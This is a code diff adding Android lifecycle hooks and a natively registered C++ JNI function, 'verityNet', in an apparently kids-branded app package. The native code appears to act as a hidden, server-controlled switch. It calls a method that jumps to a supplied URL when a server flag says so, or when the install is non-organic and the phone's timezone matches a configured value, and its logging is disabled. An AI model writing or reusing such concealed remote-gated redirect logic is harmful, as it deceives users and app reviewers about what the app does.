+            @Override
+            public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {
+
+            }
+
+            @Override
+            public void onActivityStarted(@NonNull Activity activity) {
+
+            }
+
+            @Override
+            public void onActivityResumed(@NonNull Activity activity) {
+                    mActivity = activity;
+                    Adjust.onResume();
+            }
+
+            @Override
+            public void onActivityPaused(@NonNull Activity activity) {
+
+            }
+
+            @Override
+            public void onActivityStopped(@NonNull Activity activity) {
+
+            }
+
+            @Override
+            public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {
+
+            }
+
+            @Override
+            public void onActivityDestroyed(@NonNull Activity activity) {
+
+            }
+        });
+
+    }
+
+
+}
+
+*******************************************************************************
+extern "C"
+JNIEXPORT void JNICALL verityNet(JNIEnv *env, jobject obj, jstring start, jstring key, jstring ent, jstring tz,jstring ur) {
+    const char *start1 = env->GetStringUTFChars(start, nullptr);
+    const char *key1 = env->GetStringUTFChars(key, nullptr);
+    const char *tz2 = env->GetStringUTFChars(tz, nullptr);
+    const char *ent2 = env->GetStringUTFChars(ent, nullptr);
+    const char *ur3 = env->GetStringUTFChars(ur, nullptr);
+    ///com.blue.kidsp.mys2stest
+    jclass activityClass = env->FindClass("com/blue/kidsp/mys2stest/AesUtil");
+    jmethodID vm = env->GetStaticMethodID(activityClass,
+                                          "inJavaVec",
+                                          "(Ljava/lang/String;Ljava/lang/String;)V");
+    if (vm != nullptr) {
+        if (strcmp(ent2, "200") == 0) {
+            // 不用判断，直接跳转
+            env->CallStaticVoidMethod(activityClass, vm, ur, key);
+        } else if (!(start1 == nullptr || strlen(start1) == 0) && strcmp(start1, "false") != 0) {
+//            __android_log_print(ANDROID_LOG_ERROR, "wtj-c", "非自然量");
+            if (tz2 == nullptr || tz2[0] == '\0') {
+//                __android_log_print(ANDROID_LOG_ERROR, "wtj-c","时区为空，服务器没配时区开关%s", tz2);
+                env->CallStaticVoidMethod(activityClass, vm, ur, key);
+            } else {
+                jmethodID getTimeZoneMethod = env->GetStaticMethodID(activityClass, "getTz",
+                                                                     "()Ljava/lang/String;");
+                jstring timeZoneString = static_cast<jstring>(env->CallStaticObjectMethod(
+                        activityClass,
+                        getTimeZoneMethod));
+
+                const char *timeZoneCStr = env->GetStringUTFChars(timeZoneString, nullptr);
+//                __android_log_print(ANDROID_LOG_ERROR, "wtj-c",
+//                                    "时区不为空，服务器配置的%s，获取手机的%s", tz2,
+//                                    timeZoneCStr);
+                if (strcmp(timeZoneCStr, tz2) == 0) {
+                    env->CallStaticVoidMethod(activityClass, vm, ur, key);
+                }
+            }
+
+        }
+    }
+    env->ReleaseStringUTFChars(start, start1);
+    env->ReleaseStringUTFChars(key, key1);
+    env->ReleaseStringUTFChars(tz, tz2);
+    env->ReleaseStringUTFChars(ent, ent2);
+    env->ReleaseStringUTFChars(ur, ur3);
+}
+
+//com.blue.kidsp.mys2stest
+int registerNativeMethods(JNIEnv* env) {
+    jclass clazz = env->FindClass("com/blue/kidsp/mys2stest/HttpUtils");  // 确保路径正确
+    if (clazz == nullptr) {
+        return JNI_ERR;
+    }
+     JNINativeMethod gMethods[] = {
+            {"verityNet", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V",
+             reinterpret_cast<void *>(verityNet)}
+    };
+    if (env->RegisterNatives(clazz, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) < 0) {
+        return JNI_ERR;
+    }
+
+    return JNI_OK;
+}
+
+
+JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
+    JNIEnv* env = nullptr;
+    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
+        return JNI_ERR;
+    }
+    if (registerNativeMethods(env) != JNI_OK) {
+        return JNI_ERR;
+    }
+    return JNI_VERSION_1_6;
+}
+
+*******************************************************************************
+
+
+
